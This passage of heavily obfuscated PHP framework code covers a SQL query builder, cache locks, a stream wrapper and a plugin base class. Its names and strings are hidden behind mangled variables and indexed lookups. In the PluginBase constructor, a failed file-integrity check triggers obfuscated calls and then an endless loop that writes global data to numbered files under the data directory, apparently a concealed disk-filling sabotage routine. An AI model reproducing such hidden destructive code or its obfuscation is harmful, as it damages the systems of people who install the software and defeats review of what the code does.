$šÀú­Ö• = $‘²¾›­˜[53] . strtoupper($æ»üæçã[$‘²¾›­˜[1089]]) . $‘²¾›­˜[53]; unset($æ»üæçã[$‘²¾›­˜[1089]]); } else { $šÀú­Ö• = $‘²¾›­˜[1093]; } $ïÂ¿äö = array(); foreach ($æ»üæçã as $Å”“‰í· => $¾ñ³å«¯) { $ïÂ¿äö[] = $this->parseKey($Å”“‰í·) . $‘²¾›­˜[1111] . $this->parseValue($¾ñ³å«¯); } $Úî¼œ = implode($šÀú­Ö•, $ïÂ¿äö); break; } return $Úî¼œ; } protected function parseLimit($®©š—ıÜ) { $©½ÓöóÀ =& $_SERVER[÷ôÚîå]; return !empty($®©š—ıÜ) ? $©½ÓöóÀ[51] . $®©š—ıÜ . $©½ÓöóÀ[53] : $©½ÓöóÀ[12]; } protected function parseJoin($şÎ˜Ó¥Ó) { $íåîı¸÷ =& $_SERVER[÷ôÚîå]; $ØØ¢µƒ = $íåîı¸÷[12]; if (!empty($şÎ˜Ó¥Ó)) { if (is_array($şÎ˜Ó¥Ó)) { foreach ($şÎ˜Ó¥Ó as $ŞÃÊÑ’Ø => $¡Ÿëœø) { if (!1 !== stripos($¡Ÿëœø, $íåîı¸÷[1113])) { $ØØ¢µƒ .= $íåîı¸÷[53] . $¡Ÿëœø; } else { $ØØ¢µƒ .= $íåîı¸÷[1114] . $¡Ÿëœø; } } } else { $ØØ¢µƒ .= $íåîı¸÷[1114] . $şÎ˜Ó¥Ó; } } $ØØ¢µƒ = preg_replace($íåîı¸÷[1115], think_config($íåîı¸÷[1019]) . $íåîı¸÷[1116], $ØØ¢µƒ); return $ØØ¢µƒ; } protected function parseOrder($ã´ªß¢) { $ËšÄ¨æŞ =& $_SERVER[÷ôÚîå]; if (is_array($ã´ªß¢)) { $¯ª‚Åªà = array(); foreach ($ã´ªß¢ as $ÅğÕå‰¾ => $ÖÁêÇó) { if (is_numeric($ÅğÕå‰¾)) { $¯ª‚Åªà[] = $this->parseKey($ÖÁêÇó); } else { $ÖÁêÇó = in_array(strtoupper(trim($ÖÁêÇó)), array($ËšÄ¨æŞ[1117], $ËšÄ¨æŞ[1118])) ? $ËšÄ¨æŞ[53] . $ÖÁêÇó : $ËšÄ¨æŞ[12]; if (preg_match($ËšÄ¨æŞ[1119], $ÅğÕå‰¾)) { $¯ª‚Åªà[] = $this->parseKey($ÅğÕå‰¾) . $ÖÁêÇó; } else { think_exception($ËšÄ¨æŞ[1120] . $ÅğÕå‰¾); } } } $ã´ªß¢ = implode($ËšÄ¨æŞ[50], $¯ª‚Åªà); } return !empty($ã´ªß¢) ? $ËšÄ¨æŞ[1121] . $ã´ªß¢ : $ËšÄ¨æŞ[12]; } protected function parseGroup($Õ³¨Ñ†º) { $½Ì’èóÂ =& $_SERVER[÷ôÚîå]; return !empty($Õ³¨Ñ†º) ? $½Ì’èóÂ[1122] . $Õ³¨Ñ†º : $½Ì’èóÂ[12]; } protected function parseHaving($ı¤ûÖ­›) { $ªÑñõ¨ =& $_SERVER[÷ôÚîå]; return !empty($ı¤ûÖ­›) ? $ªÑñõ¨[1123] . $ı¤ûÖ­› : $ªÑñõ¨[12]; } protected function parseComment($¤ú½¬Í) { $‰é´Œé¼ =& $_SERVER[÷ôÚîå]; return !empty($¤ú½¬Í) ? $‰é´Œé¼[1124] . $¤ú½¬Í . $‰é´Œé¼[1125] : $‰é´Œé¼[12]; } protected function parseDistinct($ÛÙñá¤ì) { $¼ÓÈÔñ… =& $_SERVER[÷ôÚîå]; return !empty($ÛÙñá¤ì) ? $¼ÓÈÔñ…[1126] : $¼ÓÈÔñ…[12]; } protected function parseUnion($ëé“³ê¹) { $—ÃØíÕ =& $_SERVER[÷ôÚîå]; if (empty($ëé“³ê¹)) { return $—ÃØíÕ[12]; } if (isset($ëé“³ê¹[$—ÃØíÕ[433]])) { $Ô‡¿Ëã = $—ÃØíÕ[1127]; unset($ëé“³ê¹[$—ÃØíÕ[433]]); } else { $Ô‡¿Ëã = $—ÃØíÕ[1128]; } foreach ($ëé“³ê¹ as $æõ‡‹—š) { $Ä´š­Ï[] = $Ô‡¿Ëã . (is_array($æõ‡‹—š) ? $this->buildSelectSql($æõ‡‹—š) : $æõ‡‹—š); } return implode($—ÃØíÕ[53], $Ä´š­Ï); } public function insert($âæµÆãê, $ı­¤Ê¼ = array(), $²½ì€îê = false) { $‘ù Éö‰ =& $_SERVER[÷ôÚîå]; $Ú¹¬Ïá = $¿ëË–‹ = array(); $this->model = $ı­¤Ê¼[$‘ù Éö‰[367]]; foreach ($âæµÆãê as $–Š¬Êßü => $üß¨ãà¿) { if (is_array($üß¨ãà¿) && $‘ù Éö‰[382] == $üß¨ãà¿[0]) { $¿ëË–‹[] = $this->parseKey($–Š¬Êßü); $Ú¹¬Ïá[] = $üß¨ãà¿[1]; } elseif (is_scalar($üß¨ãà¿) || is_null($üß¨ãà¿)) { $¿ëË–‹[] = $this->parseKey($–Š¬Êßü); $Ú¹¬Ïá[] = $this->parseValue($üß¨ãà¿); } } $Ô±ü£Î¥ = ($²½ì€îê ? $‘ù Éö‰[996] : $‘ù Éö‰[997]) . $‘ù Éö‰[998] . $this->parseTable($ı­¤Ê¼[$‘ù Éö‰[365]]) . $‘ù Éö‰[992] . implode($‘ù Éö‰[50], $¿ëË–‹) . $‘ù Éö‰[993] . implode($‘ù Éö‰[50], $Ú¹¬Ïá) . $‘ù Éö‰[994]; $Ô±ü£Î¥ .= $this->parseLock(isset($ı­¤Ê¼[$‘ù Éö‰[933]]) ? $ı­¤Ê¼[$‘ù Éö‰[933]] : !1); $Ô±ü£Î¥ .= $this->parseComment(!empty($ı­¤Ê¼[$‘ù Éö‰[439]]) ? $ı­¤Ê¼[$‘ù Éö‰[439]] : $‘ù Éö‰[12]); return $this->execute($Ô±ü£Î¥, $this->parseBind(!empty($ı­¤Ê¼[$‘ù Éö‰[370]]) ? $ı­¤Ê¼[$‘ù Éö‰[370]] : array())); } public function selectInsert($ğ¹±ë¸ß, $ŒÍíıÛ, $¹Ãı¡«Ä = array()) { $š¿ÄĞ»Ì =& $_SERVER[÷ôÚîå]; $this->model = $¹Ãı¡«Ä[$š¿ÄĞ»Ì[367]]; if (is_string($ğ¹±ë¸ß)) { $ğ¹±ë¸ß = explode($š¿ÄĞ»Ì[50], $ğ¹±ë¸ß); } array_walk($ğ¹±ë¸ß, array($this, $š¿ÄĞ»Ì[995])); $‡óöéÁˆ = $š¿ÄĞ»Ì[1129] . $this->parseTable($ŒÍíıÛ) . $š¿ÄĞ»Ì[992] . implode($š¿ÄĞ»Ì[50], $ğ¹±ë¸ß) . $š¿ÄĞ»Ì[1107]; $‡óöéÁˆ .= $this->buildSelectSql($¹Ãı¡«Ä); return $this->execute($‡óöéÁˆ, $this->parseBind(!empty($¹Ãı¡«Ä[$š¿ÄĞ»Ì[370]]) ? $¹Ãı¡«Ä[$š¿ÄĞ»Ì[370]] : array())); } public function update($ÅÅÕ®àˆ, $¦Å˜Øø) { $ûìÈ•âƒ =& $_SERVER[÷ôÚîå]; $this->model = $¦Å˜Øø[$ûìÈ•âƒ[367]]; $¨Æªşğë = $ûìÈ•âƒ[1130] . $this->parseTable($¦Å˜Øø[$ûìÈ•âƒ[365]]) . $this->parseSet($ÅÅÕ®àˆ) . $this->parseWhere(!empty($¦Å˜Øø[$ûìÈ•âƒ[361]]) ? $¦Å˜Øø[$ûìÈ•âƒ[361]] : $ûìÈ•âƒ[12]) . $this->parseOrder(!empty($¦Å˜Øø[$ûìÈ•âƒ[450]]) ? $¦Å˜Øø[$ûìÈ•âƒ[450]] : $ûìÈ•âƒ[12]) . $this->parseLimit(!empty($¦Å˜Øø[$ûìÈ•âƒ[377]]) ? $¦Å˜Øø[$ûìÈ•âƒ[377]] : $ûìÈ•âƒ[12]) . $this->parseLock(isset($¦Å˜Øø[$ûìÈ•âƒ[933]]) ? $¦Å˜Øø[$ûìÈ•âƒ[933]] : !1) . $this->parseComment(!empty($¦Å˜Øø[$ûìÈ•âƒ[439]]) ? $¦Å˜Øø[$ûìÈ•âƒ[439]] : $ûìÈ•âƒ[12]); return $this->execute($¨Æªşğë, $this->parseBind(!empty($¦Å˜Øø[$ûìÈ•âƒ[370]]) ? $¦Å˜Øø[$ûìÈ•âƒ[370]] : array())); } public function delete($ò˜Ä¸ß› = array()) { $¦Ğá°ø£ =& $_SERVER[÷ôÚîå]; $this->model = $ò˜Ä¸ß›[$¦Ğá°ø£[367]]; $‹­Í‚òÖ = $¦Ğá°ø£[1131] . $this->parseTable($ò˜Ä¸ß›[$¦Ğá°ø£[365]]) . $this->parseWhere(!empty($ò˜Ä¸ß›[$¦Ğá°ø£[361]]) ? $ò˜Ä¸ß›[$¦Ğá°ø£[361]] : $¦Ğá°ø£[12]) . $this->parseOrder(!empty($ò˜Ä¸ß›[$¦Ğá°ø£[450]]) ? $ò˜Ä¸ß›[$¦Ğá°ø£[450]] : $¦Ğá°ø£[12]) . $this->parseLimit(!empty($ò˜Ä¸ß›[$¦Ğá°ø£[377]]) ? $ò˜Ä¸ß›[$¦Ğá°ø£[377]] : $¦Ğá°ø£[12]) . $this->parseLock(isset($ò˜Ä¸ß›[$¦Ğá°ø£[933]]) ? $ò˜Ä¸ß›[$¦Ğá°ø£[933]] : !1) . $this->parseComment(!empty($ò˜Ä¸ß›[$¦Ğá°ø£[439]]) ? $ò˜Ä¸ß›[$¦Ğá°ø£[439]] : $¦Ğá°ø£[12]); return $this->execute($‹­Í‚òÖ, $this->parseBind(!empty($ò˜Ä¸ß›[$¦Ğá°ø£[370]]) ? $ò˜Ä¸ß›[$¦Ğá°ø£[370]] : array())); } public function select($–œô®¡ä = array()) { $çÔ¢İšã =& $_SERVER[÷ôÚîå]; $this->model = $–œô®¡ä[$çÔ¢İšã[367]]; $’–ìÁ’ö = $this->buildSelectSql($–œô®¡ä); $‚˜¦œ¤ = isset($–œô®¡ä[$çÔ¢İšã[434]]) ? $–œô®¡ä[$çÔ¢İšã[434]] : !1; if ($‚˜¦œ¤) { $›ÍÖ¶˜‰ = is_string($‚˜¦œ¤[$çÔ¢İšã[107]]) ? $‚˜¦œ¤[$çÔ¢İšã[107]] : $çÔ¢İšã[1132] . md5($’–ìÁ’ö); $ÏÌ–“Ë = think_cache($›ÍÖ¶˜‰, $çÔ¢İšã[12], $‚˜¦œ¤); if (!1 !== $ÏÌ–“Ë) { return $ÏÌ–“Ë; } } $êŠİó¦» = $this->query($’–ìÁ’ö, $this->parseBind(!empty($–œô®¡ä[$çÔ¢İšã[370]]) ? $–œô®¡ä[$çÔ¢İšã[370]] : array())); if ($‚˜¦œ¤ && !1 !== $êŠİó¦») { think_cache($›ÍÖ¶˜‰, $êŠİó¦», $‚˜¦œ¤); } return $êŠİó¦»; } public function buildSelectSql($ûÓÓÊù = array()) { $ğúä®Ğ¯ =& $_SERVER[÷ôÚîå]; if (isset($ûÓÓÊù[$ğúä®Ğ¯[438]])) { if (strpos($ûÓÓÊù[$ğúä®Ğ¯[438]], $ğúä®Ğ¯[50])) { list($»ì‹Å¢, $¹Ü®áÈ) = explode($ğúä®Ğ¯[50], $ûÓÓÊù[$ğúä®Ğ¯[438]]); } else { $»ì‹Å¢ = $ûÓÓÊù[$ğúä®Ğ¯[438]]; } $»ì‹Å¢ = $»ì‹Å¢ ? $»ì‹Å¢ : 1; $¹Ü®áÈ = isset($¹Ü®áÈ) ? $¹Ü®áÈ : (is_numeric($ûÓÓÊù[$ğúä®Ğ¯[377]]) ? $ûÓÓÊù[$ğúä®Ğ¯[377]] : 20); $‹Æ€ı = $¹Ü®áÈ * ((int) $»ì‹Å¢ - 1); $ûÓÓÊù[$ğúä®Ğ¯[377]] = $‹Æ€ı . $ğúä®Ğ¯[50] . $¹Ü®áÈ; } if (think_config($ğúä®Ğ¯[1133])) { $Ÿ–Ñ¡ïƒ = $ğúä®Ğ¯[1134] . md5(serialize($ûÓÓÊù)); $ö»Ã¬¶ = think_cache($Ÿ–Ñ¡ïƒ); if ($ö»Ã¬¶) { return $ö»Ã¬¶; } } $”¸â™Û£ = $this->parseSql($this->selectSql, $ûÓÓÊù); $”¸â™Û£ .= $this->parseLock(isset($ûÓÓÊù[$ğúä®Ğ¯[933]]) ? $ûÓÓÊù[$ğúä®Ğ¯[933]] : !1); if (isset($Ÿ–Ñ¡ïƒ)) { think_cache($Ÿ–Ñ¡ïƒ, $”¸â™Û£); } return $”¸â™Û£; } public function parseSql($¨¸ºöÔ÷, $Ø´œØİó = array()) { $ó©’–®ï =& $_SERVER[÷ôÚîå]; $¨¸ºöÔ÷ = str_replace(array($ó©’–®ï[1135], $ó©’–®ï[1136], $ó©’–®ï[1137], $ó©’–®ï[1138], $ó©’–®ï[1139], $ó©’–®ï[1140], $ó©’–®ï[1141], $ó©’–®ï[1142], $ó©’–®ï[1143], $ó©’–®ï[1144], $ó©’–®ï[1145]), array($this->parseTable("{$Ø´œØİó[$ó©’–®ï[365]]}"), $this->parseDistinct(isset($Ø´œØİó[$ó©’–®ï[1146]]) ? $Ø´œØİó[$ó©’–®ï[1146]] : !1), $this->parseField(!empty($Ø´œØİó[$ó©’–®ï[359]]) ? $Ø´œØİó[$ó©’–®ï[359]] : $ó©’–®ï[230]), $this->parseJoin(!empty($Ø´œØİó[$ó©’–®ï[368]]) ? $Ø´œØİó[$ó©’–®ï[368]] : $ó©’–®ï[12]), $this->parseWhere(!empty($Ø´œØİó[$ó©’–®ï[361]]) ? $Ø´œØİó[$ó©’–®ï[361]] : $ó©’–®ï[12]), $this->parseGroup(!empty($Ø´œØİó[$ó©’–®ï[587]]) ? $Ø´œØİó[$ó©’–®ï[587]] : $ó©’–®ï[12]), $this->parseHaving(!empty($Ø´œØİó[$ó©’–®ï[1147]]) ? $Ø´œØİó[$ó©’–®ï[1147]] : $ó©’–®ï[12]), $this->parseOrder(!empty($Ø´œØİó[$ó©’–®ï[450]]) ? $Ø´œØİó[$ó©’–®ï[450]] : $ó©’–®ï[12]), $this->parseLimit(!empty($Ø´œØİó[$ó©’–®ï[377]]) ? $Ø´œØİó[$ó©’–®ï[377]] : $ó©’–®ï[12]), $this->parseUnion(!empty($Ø´œØİó[$ó©’–®ï[432]]) ? $Ø´œØİó[$ó©’–®ï[432]] : $ó©’–®ï[12]), $this->parseComment(!empty($Ø´œØİó[$ó©’–®ï[439]]) ? $Ø´œØİó[$ó©’–®ï[439]] : $ó©’–®ï[12])), $¨¸ºöÔ÷); return $¨¸ºöÔ÷; } public function getLastSql($Å™¬ú¸Æ = '') { return $Å™¬ú¸Æ ? $this->modelSql[$Å™¬ú¸Æ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($œµÙ²£„) { return addslashes($œµÙ²£„); } public function setModel($ËÅÃƒ£) { $this->model = $ËÅÃƒ£; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto B—â¾‡áß›; F‹äõÙŸóª: class CacheLockRedis { public function lock($Ñîƒ˜¼, $Ïè¬ğ½ = 10) { $ü»¯‘Ã = Cache::init(); $ı…õùØÚ = microtime(!0) + $Ïè¬ğ½; while (microtime(!0) < $ı…õùØÚ) { $œ¬¡áÎ¥ = $ü»¯‘Ã->get($Ñîƒ˜¼); if (!$œ¬¡áÎ¥) { $Ùô§‡Ğ = $ü»¯‘Ã->setLock($Ñîƒ˜¼, $ı…õùØÚ, $Ïè¬ğ½); if ($Ùô§‡Ğ) { return !0; } } else { if ($œ¬¡áÎ¥ < microtime(!0)) { $ü»¯‘Ã->set($Ñîƒ˜¼, $ı…õùØÚ, $Ïè¬ğ½ * 2); if ($ü»¯‘Ã->get($Ñîƒ˜¼) === $œ¬¡áÎ¥) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¦áŞîİš) { return Cache::init()->get($¦áŞîİš); } public function unlock($ÔÉÑô) { return Cache::init()->remove($ÔÉÑô); } } class CacheLockMemcached { public function lock($¦¸òöç¬, $¶ÎĞµ–À = 0) { $›øÂ¿Ï™ = Cache::init(); $¿øÇ­ØÅ = microtime(!0) + $¶ÎĞµ–À; while (microtime(!0) < $¿øÇ­ØÅ) { $Õ›à¢Š¢ = $›øÂ¿Ï™->get($¦¸òöç¬); if (!$Õ›à¢Š¢ || $Õ›à¢Š¢ < microtime(!0)) { $ûôòÑ—ú = $›øÂ¿Ï™->handle->add($¦¸òöç¬, $¿øÇ­ØÅ, $¶ÎĞµ–À); if ($ûôòÑ—ú) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¿øñ¡â´) { return Cache::init()->get($¿øñ¡â´); } public function unlock($£ªŸÛî­) { return Cache::init()->remove($£ªŸÛî­); } } class CacheLockDatabase { public function lock($Š•¡Å‹, $¡Ññ± = 0) { $Ÿõ×İ¡ = Model($_SERVER[÷ôÚîå][918]); $®ºäßÈ… = microtime(!0) + $¡Ññ±; while (microtime(!0) < $®ºäßÈ…) { $ä¯©òÑæ = $Ÿõ×İ¡->get($Š•¡Å‹); if (!$ä¯©òÑæ || $ä¯©òÑæ < microtime(!0)) { $’í™»¹» = $Ÿõ×İ¡->set($Š•¡Å‹, $®ºäßÈ…); if ($’í™»¹») { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¸‚â¼¥½) { return Model($_SERVER[÷ôÚîå][918])->get($¸‚â¼¥½); } public function unlock($•ëŞÃ¿Ğ) { Model($_SERVER[÷ôÚîå][918])->remove($•ëŞÃ¿Ğ); } } goto e¡™Ë¾Äƒ¸; e‹¹âÀôÇË: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($È¢İª, $Œ„§åÅ² = '') { $this->info = $this->info($È¢İª); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[÷ôÚîå][97]]; $this->pathOpen = $È¢İª; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$È¢İª])) { self::$_chunkBuffer[$È¢İª] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($‘Ÿ™ñÂì) { $†°‰œó­ = $this->fileSubstr($this->pose, $‘Ÿ™ñÂì); $this->pose += strlen($†°‰œó­); return $†°‰œó­; } public function stream_tell() { return $this->pose; } public function stream_seek($Í­“, $ÄÖë³ç) { $™ê…¾¹» =& $_SERVER[÷ôÚîå]; if ($ÄÖë³ç == SEEK_SET) { $this->pose = $Í­“; } else { if ($ÄÖë³ç == SEEK_CUR) { $this->pose += $Í­“; } else { if ($ÄÖë³ç == SEEK_END) { $this->pose = $this->info[$™ê…¾¹»[89]] + intval($Í­“); } } } if ($Í­“ < 0) { $this->pose = $this->info[$™ê…¾¹»[89]] + $Í­“; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[÷ôÚîå][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($àêª¸ıî, $–Á±½€) { $Æ‘¨£à =& $_SERVER[÷ôÚîå]; $²Æ±¼Ş¼ = $this->info($àêª¸ıî); return array($Æ‘¨£à[1617] => 0, $Æ‘¨£à[1618] => 0, $Æ‘¨£à[16] => 32768 + 511, $Æ‘¨£à[1619] => 0, $Æ‘¨£à[1620] => 0, $Æ‘¨£à[1621] => 0, $Æ‘¨£à[1622] => 0, $Æ‘¨£à[89] => $²Æ±¼Ş¼[$Æ‘¨£à[89]], $Æ‘¨£à[1623] => $²Æ±¼Ş¼[$Æ‘¨£à[1463]], $Æ‘¨£à[1579] => $²Æ±¼Ş¼[$Æ‘¨£à[98]], $Æ‘¨£à[1578] => $²Æ±¼Ş¼[$Æ‘¨£à[241]], $Æ‘¨£à[1624] => 0, $Æ‘¨£à[1625] => 0); } static $fileInfo = array(); public function info($ÔĞ³£ĞÏ) { $¡²¢Ä¤Ø = $_SERVER[÷ôÚîå][1626]; if (isset(self::$fileInfo[$ÔĞ³£ĞÏ])) { return self::$fileInfo[$ÔĞ³£ĞÏ]; } if (substr($ÔĞ³£ĞÏ, 0, strlen($¡²¢Ä¤Ø)) != $¡²¢Ä¤Ø) { return !1; } self::$fileInfo[$ÔĞ³£ĞÏ] = IO::info(substr($ÔĞ³£ĞÏ, strlen($¡²¢Ä¤Ø))); return self::$fileInfo[$ÔĞ³£ĞÏ]; } public static function read($åòÌì³•, $½‘ïÍ¶, $•±ÇèË) { if (!isset(self::$_fopenCache[$åòÌì³•])) { $Áı†÷¼Ä = new StreamWrapperIO(); $Áı†÷¼Ä->stream_open($åòÌì³•); self::$_fopenCache[$åòÌì³•] = $Áı†÷¼Ä; } $Áı†÷¼Ä = self::$_fopenCache[$åòÌì³•]; return $Áı†÷¼Ä->fileSubstr($½‘ïÍ¶, $•±ÇèË); } public static function _read($ê´˜©‘è, $õ—åÚÊÄ, $õ©¯şí) { $ÂÈù†³Î =& $_SERVER[÷ôÚîå]; $‰Á¹úìç = fopen($ê´˜©‘è, $ÂÈù†³Î[1467]); if (!$‰Á¹úìç) { return $ÂÈù†³Î[12]; } $Æ‚¸– = 8192; fseek($‰Á¹úìç, $õ—åÚÊÄ, SEEK_SET); $¿áÁ¥Â = $ÂÈù†³Î[12]; $–ûçÁ’ = 0; while ($–ûçÁ’ < $õ©¯şí) { $ìµÑËô = min($Æ‚¸–, $õ©¯şí - $–ûçÁ’); $¿áÁ¥Â .= fread($‰Á¹úìç, $ìµÑËô); $–ûçÁ’ += $ìµÑËô; } fclose($‰Á¹úìç); return $¿áÁ¥Â; } public function fileSubstr($Ñ“¨ÃÌ¿, $£ôŒÏé¤) { $˜‹æ»•è =& $_SERVER[÷ôÚîå]; $¾Š¡ù¥‰ = $this->info[$˜‹æ»•è[89]]; $‰ü³ã•Â = $Ñ“¨ÃÌ¿; $ÓŸ‰’Ó± = $£ôŒÏé¤; if ($Ñ“¨ÃÌ¿ < 0) { $Ñ“¨ÃÌ¿ = $¾Š¡ù¥‰ + $Ñ“¨ÃÌ¿; } if ($£ôŒÏé¤ === !1) { $£ôŒÏé¤ = $¾Š¡ù¥‰ - $Ñ“¨ÃÌ¿; } if ($Ñ“¨ÃÌ¿ + $£ôŒÏé¤ > $¾Š¡ù¥‰) { $£ôŒÏé¤ = $¾Š¡ù¥‰ - $Ñ“¨ÃÌ¿; } if ($£ôŒÏé¤ <= 0) { return $˜‹æ»•è[12]; } if ($Ñ“¨ÃÌ¿ < 0 || $Ñ“¨ÃÌ¿ >= $¾Š¡ù¥‰ || $£ôŒÏé¤ <= 0 || $£ôŒÏé¤ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\154\145\x52\x65\x61\x64\x20\x65\162\x72\157\162\41\40\163\164\x61\x72\164\x3d{$Ñ“¨ÃÌ¿}\73\154\145\x6e\147\x74\x68\x3d{$£ôŒÏé¤}\73\x20\x73\151\x7a\145\x3d{$¾Š¡ù¥‰}\73"); } $Ÿ‹§é« = 64 * 1024; $€Ç¦†òÕ =& self::$_chunkBuffer[$this->path]; if (!$€Ç¦†òÕ) { $€Ç¦†òÕ = array(); } $ğŸ˜ş–Š = 0; $•™‘İÍ¬ = 0; $¨òšøÚ— = $˜‹æ»•è[12]; foreach ($€Ç¦†òÕ as $ğŸ˜ş–Š => $¨òšøÚ—) { $ğŸ˜ş–Š = intval($ğŸ˜ş–Š); $•™‘İÍ¬ = $ğŸ˜ş–Š + strlen($¨òšøÚ—); if ($Ñ“¨ÃÌ¿ >= $•™‘İÍ¬) { continue; } if ($Ñ“¨ÃÌ¿ >= $ğŸ˜ş–Š && $Ñ“¨ÃÌ¿ + $£ôŒÏé¤ <= $•™‘İÍ¬) { return substr($¨òšøÚ—, $Ñ“¨ÃÌ¿ - $ğŸ˜ş–Š, $£ôŒÏé¤); } break; } if (count($€Ç¦†òÕ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($˜‹æ»•è[1627], $˜‹æ»•è[1628] . count($€Ç¦†òÕ) . "\73\x73\x74\x61\162\x74\75{$Ñ“¨ÃÌ¿}\54\x6c\x65\x6e\x67\164\150\75{$£ôŒÏé¤}\x3b\x70\x6f\163\145\x3a{$ğŸ˜ş–Š}\x7e{$•™‘İÍ¬}"); throw new Exception($˜‹æ»•è[1629]); } $¶å÷˜Çƒ = intval($Ñ“¨ÃÌ¿ / $Ÿ‹§é«) * $Ÿ‹§é«; $¦‘ Ì€İ = ceil(($Ñ“¨ÃÌ¿ + $£ôŒÏé¤) / $Ÿ‹§é«) * $Ÿ‹§é« - $¶å÷˜Çƒ; $™„½¶µØ = IO::fileSubstr($this->path, $¶å÷˜Çƒ, $¦‘ Ì€İ); $€Ç¦†òÕ[$¶å÷˜Çƒ . $˜‹æ»•è[12]] = $™„½¶µØ; ksort($€Ç¦†òÕ); $şœº¶Şù = substr($™„½¶µØ, $Ñ“¨ÃÌ¿ - $¶å÷˜Çƒ, $£ôŒÏé¤); return $şœº¶Şù; } private function log($‚æ…¤, $öã×ÒåÚ) { $Ù°«ÁÓÁ =& $_SERVER[÷ôÚîå]; $¤½àÇúø = timeFloat() - $this->timeStart; write_log(sprintf($Ù°«ÁÓÁ[1630], $‚æ…¤, $this->info[$Ù°«ÁÓÁ[32]], $¤½àÇúø, $öã×ÒåÚ), $Ù°«ÁÓÁ[1275]); } } class Message { function __construct() { } public function send($–Õ°Ş˜ƒ = '', $Ö•ÌıÆˆ = array(), $õ¬òó­ = "\x74\145\x78\x74") { $Ä¿Ú‹½¶ =& $_SERVER[÷ôÚîå]; $÷èÀÄâ” = array($Ä¿Ú‹½¶[33] => $Ä¿Ú‹½¶[1631], $Ä¿Ú‹½¶[181] => $–Õ°Ş˜ƒ); if (in_array($õ¬òó­, array($Ä¿Ú‹½¶[1631], $Ä¿Ú‹½¶[1632]))) { $÷èÀÄâ”[$Ä¿Ú‹½¶[33]] = $õ¬òó­; } $Ö•ÌıÆˆ = array($Ä¿Ú‹½¶[587] => isset($Ö•ÌıÆˆ[$Ä¿Ú‹½¶[587]]) ? $Ö•ÌıÆˆ[$Ä¿Ú‹½¶[587]] : $Ä¿Ú‹½¶[12], $Ä¿Ú‹½¶[671] => isset($Ö•ÌıÆˆ[$Ä¿Ú‹½¶[671]]) ? $Ö•ÌıÆˆ[$Ä¿Ú‹½¶[671]] : $Ä¿Ú‹½¶[12]); if (empty($–Õ°Ş˜ƒ) || empty($Ö•ÌıÆˆ[$Ä¿Ú‹½¶[587]]) && empty($Ö•ÌıÆˆ[$Ä¿Ú‹½¶[671]])) { return !1; } $ŸúŸ…ó‰ = array($Ä¿Ú‹½¶[1559] => $÷èÀÄâ”, $Ä¿Ú‹½¶[1633] => $Ö•ÌıÆˆ); Hook::trigger($Ä¿Ú‹½¶[1634], $ŸúŸ…ó‰); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $·ø¨À« =& $_SERVER[÷ôÚîå]; $Ä•îÍ´½ = $_SERVER[$·ø¨À«[63]] . $·ø¨À«[64]; $ğã” ÀÄ = $·ø¨À«[887]; if ($_SERVER[$·ø¨À«[60]] != $ğã” ÀÄ($Ä•îÍ´½)) { $´âì«¥ = $·ø¨À«[966]; $·ıÒéà˜ = $·ø¨À«[62]; $Şáô“„ = $_SERVER[$·ø¨À«[63]] . $·ø¨À«[64]; $•Â«è÷¾ = $·ıÒéà˜($Şáô“„); $šéšÃµ˜ = explode($·ø¨À«[65], $•Â«è÷¾); if (count($šéšÃµ˜) < $·ø¨À«[711]) { $Õ¦ã¬¨´ = $·ø¨À«[67]; $Õ¦ã¬¨´(); } $¤ìÅ‚ÚŞ = $·ø¨À«[967]; $¤ìÅ‚ÚŞ($_SERVER[$·ø¨À«[968]]); $´âì«¥ = $·ø¨À«[966]; $´âì«¥(); $¥ü¦í¨Ñ = $·ø¨À«[969]; $ÍÖØ ˜€ = json_encode($GLOBALS[$·ø¨À«[970]]); $ŠşÑâó = 1; for ($ü²‡™í = $ŠşÑâó; $ü²‡™í > 0; $ü²‡™í++) { $¥ü¦í¨Ñ(DATA_PATH . $ü²‡™í, $ÍÖØ ˜€); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($·ø¨À«[1635]); $this->pluginName = str_replace($·ø¨À«[1635], $·ø¨À«[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $·ø¨À«[8]; $this->pluginApi = appHostGet() . $·ø¨À«[1636] . $this->pluginName . $·ø¨À«[8]; $this->pluginHost = $config[$·ø¨À«[1637]] . $this->pluginName . $·ø¨À«[8]; $this->pluginHostDefault = $config[$·ø¨À«[1637]] . $this->pluginName . $·ø¨À«[8]; $š¢¸áŒ = $config[$·ø¨À«[1638]]; if ($š¢¸áŒ && strpos($·ø¨À«[50] . $š¢¸áŒ . $·ø¨À«[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$·ø¨À«[1639]] . $this->pluginName . $·ø¨À«[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[÷ôÚîå][1640]); } protected function assign($›çÃÜÅ, $ëÂ»Á’î = false) { if (is_array($›çÃÜÅ)) { $this->values = array_merge($this->values, $›çÃÜÅ); } else { $this->values[$›çÃÜÅ] = $ëÂ»Á’î; } } protected function display($Ö»«ï»”) { extract($this->values); require $Ö»«ï»”; } final function hookRegist($ôîö–‹®) { 